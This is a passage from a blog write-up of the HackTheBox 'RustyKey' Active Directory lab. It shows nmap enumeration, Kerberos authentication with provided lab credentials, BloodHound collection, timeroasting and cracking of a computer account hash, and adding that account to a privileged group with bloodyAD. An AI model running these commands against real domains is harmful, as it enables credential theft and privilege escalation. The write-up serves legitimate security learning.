---
title: RustyKey
description: Hard windows, wooohooooooo
date: 2025-10-11 18:00:00 +0000
categories: [HackTheBox,Windows]
tags: [Windows,Hard,AD,HackTheBox]
image: assets/img/hackthebox.png
---

# Introduction
This box is a hard Active Directory windows machine from hackthebox. It features TimeRoasting, Context menu registry shenanigans, and Resource Based Constrained Delegation. I learnt a lot doing this box, so I made this write up to maybe help the 3 yearly readers of this blog and especially to force myself to fully understand everything to the point where I can explain it.

# Enumeration
```terminal
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 21:02 CEST
Nmap scan report for 10.10.11.75
Host is up (0.025s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-29 03:02:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49721/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-29T03:03:47
|_  start_date: N/A
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.39 seconds
```
I'll add rustykey.htb to my `/etc/hosts` file.
Then I'll get name of the dc :
```terminal
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ nslookup -type=srv _ldap._tcp.dc._msdcs.rustykey.htb rustykey.htb
Server:         rustykey.htb
Address:        10.129.6.84#53

_ldap._tcp.dc._msdcs.rustykey.htb       service = 0 100 389 dc.rustykey.htb.
```

The box had credentials provided, we'll use them to try to authenticate.
```terminal
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A'
SMB         10.129.6.84     445    10.129.6.84      [*]  x64 (name:10.129.6.84) (domain:10.129.6.84) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.6.84     445    10.129.6.84      [-] 10.129.6.84\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```
As we can see, NTLM authentication is disabled. But it's okay, we can try to use kerberos auth instead. 
> Since kerberos authentication relies on the current time, I need to make my machine believe it is on the same schedule as the box. The nmap scan reported that I had an 8h difference with the machine. I'll use `faketime` to make my commands use the same time as the machine. I'll add an alias for convenience : `alias ft="faketime -f '+8h'"`.
{: .prompt-info }

Using kerberos auth :
```terminal
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ ft nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k --shares
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
SMB         dc.rustykey.htb 445    dc               [*] Enumerated shares
SMB         dc.rustykey.htb 445    dc               Share           Permissions     Remark
SMB         dc.rustykey.htb 445    dc               -----           -----------     ------
SMB         dc.rustykey.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.rustykey.htb 445    dc               C$                              Default share
SMB         dc.rustykey.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.rustykey.htb 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.rustykey.htb 445    dc               SYSVOL          READ            Logon server share
```
It does work ! We don't have any non default shares, the smb server is useless.
As usual in Active Directory environment, we will use bloodhound to see gather and analyse data in the domain. This data is shared on the ldap server, so we will query it and give the data to bloodhound.
I'll be using nxc again to do this :
```terminal
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ ft nxc ldap -k rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' --dns-server 10.129.6.84 --bloodhound -c all
LDAP        rustykey.htb    389    DC               [*] None (name:DC) (domain:rustykey.htb)
LDAP        rustykey.htb    389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
LDAP        rustykey.htb    389    DC               Resolved collection methods: trusts, objectprops, acl, session, dcom, rdp, psremote, group, container, localadmin
LDAP        rustykey.htb    389    DC               Using kerberos auth without ccache, getting TGT
LDAP        rustykey.htb    389    DC               Done in 00M 06S
LDAP        rustykey.htb    389    DC               Compressing output into /home/samsam/.nxc/logs/DC_rustykey.htb_2025-06-30_012236_bloodhound.zip
```
We'll analyze the gathered data later, as we don't need it for now.
# User
## Roasting
There are 3 types of roasting attack on kerberos, AS-REP-Roasting, Kerberoasting and [timeroasting](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory). Timeroasting is fairly recent and allows us to gather all the hashes from all the computer in the domain. This usually isn't an issue as domain computer passwords are randomly generated strings, but it's still worth checking if any of them crack. We can use the `timeroast` module of nxc to perform this attack.

```terminal
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ ft nxc smb dc.rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -k -M timeroast | tee roasted.hashes
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ cat roasted.hashes |tail -n +4|awk '{print $5}'>hashes
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ cd ../tools/hashcat-6.2.6
┌──(samsam㉿pika-pika)-[~/htb/tools/hashcat-6.2.6]
└─$ ./hashcat.bin -m 31300 ~/htb/tools/Timeroast/roasted /usr/share/wordlists/rockyou.txt --user                                                            
hashcat (v6.2.6-1051-g7fff4c929) starting
... redacted ...
$sntp-ms$cdd5d26016a02c9b4dcb9da17bca8e37$1c0111e900000000000a14514c4f434cec0b29d7eaf632f7e1b8428bffbfcd0aec0b44a1feede6f8ec0b44a1feee0f3c:R******!
... redacted ...
```
One of the hashes crack :) 
At the time of writing, only the hashcat beta supports this encryption mode, that's why I'm not straight up using hashcat in the command line.

Looking back at the timeroast capture file, this hash was for RID 1125.
We can then use powerview to see what is its sAMAccountName. 
```terminal
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ ft powerview 'rustykey.htb/rr.parker':'8#t5HE8L!W3A'@dc.rustykey.htb -k -q 'Get-DomainObject -LDAPFilter "(ObjectClass=computer)" -Properties sAMAccountName,objectSid' |grep 1125 -A1
[2025-06-30 01:17:36] [Formatter] Results from cache. Use 'Clear-Cache' or '-NoCache' to refresh.
objectSid          : S-1-5-21-3316070415-896458127-4139322052-1125
sAMAccountName     : IT-Computer3$
```

We now have a valid login for `IT-Computer3$` !
Looking at bloodhound with the data collected earlier, we see that `IT-Computer3$` can add itself to the HELPDESK group. We'll do it right away using `bloodyAD`
```terminal
┌──(samsam㉿pika-pika)-[~/htb/rustykey]
└─$ ft bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-Computer3$' -p 'R******!' -k add groupMember "helpdesk" 'it-computer3$'
[+] it-computer3$ added to helpdesk
```


![bloodhoundHelpdesk.png](assets/img/rustykey/bloodhoundHelpdesk.png)
HELPDESK is really interesting as it's a non default one and has `ForceChangePassword` over several users. Furthermore, all of these users are part of the `REMOTE MANAGEMENT USERS` ( except dd.ali ). 
